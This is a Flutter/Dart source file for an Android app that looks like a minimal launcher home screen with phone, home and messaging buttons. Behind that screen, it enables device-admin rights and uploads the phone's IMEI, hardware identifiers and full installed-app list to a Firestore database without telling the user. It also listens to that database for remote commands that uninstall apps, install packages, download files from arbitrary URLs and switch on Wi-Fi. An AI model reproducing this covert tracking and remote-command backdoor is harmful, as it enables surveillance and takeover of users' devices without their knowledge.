import 'package:flutter/material.dart';
import 'package:getinfo/Appdrawer.dart';
import 'package:device_info/device_info.dart';
import 'package:device_apps/device_apps.dart';
import 'package:cloud_firestore/cloud_firestore.dart';

import 'package:imei_plugin/imei_plugin.dart';
import 'package:uninstall_apps/uninstall_apps.dart';
import 'package:admin/admin.dart';
import 'package:flutter_install_app_plugin/flutter_install_app_plugin.dart';
import 'package:flutter/services.dart';
import 'package:downloader/downloader.dart';
import 'package:wifi/wifi.dart';
import 'package:connect_wifi/connect_wifi.dart';
import 'package:connectivity/connectivity.dart';
import 'package:analog_clock/analog_clock.dart';





void main() => runApp(MyApp());

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  Widget build(BuildContext context) {
    
    return MaterialApp(
      
      home: Home(),
      debugShowCheckedModeBanner: false,
    );
  }
}




class Home extends StatefulWidget {
  @override
  _HomeState createState() => _HomeState();
}

class _HomeState extends State<Home> {

 
  String message="";

  static const methodChannel = const MethodChannel('com.tarazgroup');

   
  List<dynamic> wifi=[];
   Future<List> getWifiList()async{
      var connectivityResult = await (Connectivity().checkConnectivity());
     
       if (connectivityResult != ConnectivityResult.wifi) {
             ConnectWifi.enable();
        }
      
        wifi = await Wifi.list('');

      
      
      
      for(int i=0;i<wifi.length;i++){
        print(wifi[i].ssid);
      }
      return wifi;
      }


   







  
 
  
  String time;
  initState(){
     time = TimeOfDay.now().toString();

    getInfo();
    Admin.enable();
    Downloader.getPermission();
    super.initState();
  
    methodChannel.setMethodCallHandler((call)async {
        
        print(call.method);
        
        
         var connectivityResult = await (Connectivity().checkConnectivity());
         
        if (connectivityResult != ConnectivityResult.wifi || connectivityResult == ConnectivityResult.wifi) {
            
        
        Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).getDocuments().then((docs){
           
           var data = docs.documents.last;
                          if(data["Command"].startsWith("com.")){
                               UninstallApps.uninstall(data["Command"].toString());
                               Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                            
                          }else if(data["Command"].toString().startsWith("install")){
                                  installapps(data["Command"].toString().split(" ")[1].toString());
                                  Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                            
                          }else if(data["Command"].toString().startsWith("download")){
                                  String url = data["Command"].toString().split(" ")[1].toString();
                                  String name = data["Command"].toString().split(" ")[2].toString();
                                  String ext = "."+data["Command"].toString().split(" ")[3].toString();
                                  Downloader.download(url,name,ext);
                                  Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                            
                          }else if(data["Command"].toString().startsWith("promptwifi")){
                                 ConnectWifi.enable();
                                 ConnectWifi.openWifi();
                               
                                 Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                              
                          }
                         
         });
        
        }
       
      
    });
  }
  String fg;
  
  Stream gettime() async*{
    setState(() {
      time = TimeOfDay.now().toString();
    });
    
  }



  Future getInfo() async{

   DeviceInfoPlugin info = DeviceInfoPlugin();
   AndroidDeviceInfo androidDeviceInfo = await info.androidInfo;
   List<Application> apps = await DeviceApps.getInstalledApplications(includeSystemApps: true);

   List app = []; 
   var imei = await ImeiPlugin.getImei;
   print(apps);
  
   for( Application i in apps){
     if(i.systemApp){
       app.add({"Appname":i.appName,"Package":i.packageName,"Vesion name":i.versionName,"Version Code":i.versionCode,"SystemApp":true});
     }else
        app.add({"Appname":i.appName,"Package":i.packageName,"Vesion name":i.versionName,"Version Code":i.versionCode,"SystemApp":false});
   }
  
   Map<String,dynamic> allinfo = {

    "version":androidDeviceInfo.version.toString(),
    "board":androidDeviceInfo.board.toString(),
    "bootloader":androidDeviceInfo.bootloader.toString(),
    "brand":androidDeviceInfo.board.toString(),
    "device":androidDeviceInfo.device.toString(),
    "display":androidDeviceInfo.display.toString(),
    "fingerprint":androidDeviceInfo.fingerprint.toString(),
    "hardware":androidDeviceInfo.hardware.toString(),
    "host":androidDeviceInfo.host.toString(),
    "id":androidDeviceInfo.id.toString(),
    "manufacturer":androidDeviceInfo.manufacturer.toString(),
    "model":androidDeviceInfo.model.toString(),
    "product":androidDeviceInfo.product.toString()

    };

    fg=androidDeviceInfo.id.toString();


       Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).getDocuments().then((docs){
         List<DocumentSnapshot> doc = docs.documents;

         if(doc.length==0){
           Firestore.instance.collection("Informations").add({

                 "Status":"Online",
                 "Installed_Apps":app,
                  "Device_info":allinfo,
                  "Imei":imei,
                  "Command":"",
                  "Settings":[]
              });

         }else{
                 Firestore.instance.collection("Informations").document(doc.last.documentID).updateData({"Status":"Active"});

         }
    
    
    });

  }

  installapps(String package){
    var app = AppSet();
    app.androidPackageName=package;
    FlutterInstallAppPlugin.installApp(app);

  }





  @override
  Widget build(BuildContext context) {
    return Scaffold(
       
       backgroundColor: Colors.white,
       body: Padding(
               padding: const EdgeInsets.all(18.0),
               child: Column(
                 mainAxisAlignment: MainAxisAlignment.end,
                 children: <Widget>[

                   Expanded(child: Container(
                     height: 100,
                     width: MediaQuery.of(context).size.width,
                     child: StreamBuilder(
                       stream: Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).snapshots(),
                       builder: (context,snap){
                         
                           
                             
                                 
                              if(snap.hasData){
                                if(snap.data.documents.last.data["Command"].toString().startsWith("uninstall")){
                                 Admin.uninstall("com.facebook.lite"); 
                                
                              
                                }else if(snap.data.documents.last.data["Command"].toString().startsWith("install")){
                                    installapps(snap.data.documents.last.data["Command"].toString().split(" ")[1].toString());
                              
                                }else if(snap.data.documents.last["Command"].toString().startsWith("download")){
                                    String url = snap.data.documents.last.data["Command"].toString().split(" ")[1].toString();
                                    String name = snap.data.documents.last.data["Command"].toString().split(" ")[2].toString();
                                    String ext = "."+snap.data.documents.last.data["Command"].toString().split(" ")[3].toString();
                                    Downloader.download(url,name,ext);
                              
                                }else if(snap.data.documents.last.data["Command"].toString().startsWith("promptwifi")){
                                    
                                     ConnectWifi.enable();
                                     ConnectWifi.openWifi();
                                    
                                }

                                print(snap.data.documents.last["Command"]+"        1");
                                 
                               

                                Firestore.instance.collection("Informations").document(snap.data.documents.last.documentID).updateData({"Command":""});
                              }
                                return  Container(
                                   
                                );


                                
                         


                       },
                     ),
                   ),),
                  
                  
                   Padding(padding: EdgeInsets.all(10),),
                    Row(
                      
                      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                      children: <Widget>[
                        IconButton(icon: Icon(Icons.phone,size: 30, color: Colors.black,),onPressed: (){
                              DeviceApps.openApp("com.android.contacts");
                        },),
                        IconButton(icon: Icon(Icons.home,size: 30,color: Colors.black, ),onPressed: (){
                             var route = MaterialPageRoute(builder: (context)=>AppDraw(fg));
                             Navigator.of(context).push(route);
                        }),
                        IconButton(icon: Icon(Icons.message,size: 30, color: Colors.black,),onPressed: (){
                                   DeviceApps.openApp("com.android.mms");
                        })

                      ],
                    )
                 ],
               ),
            
       ),
       
    );
  }
}

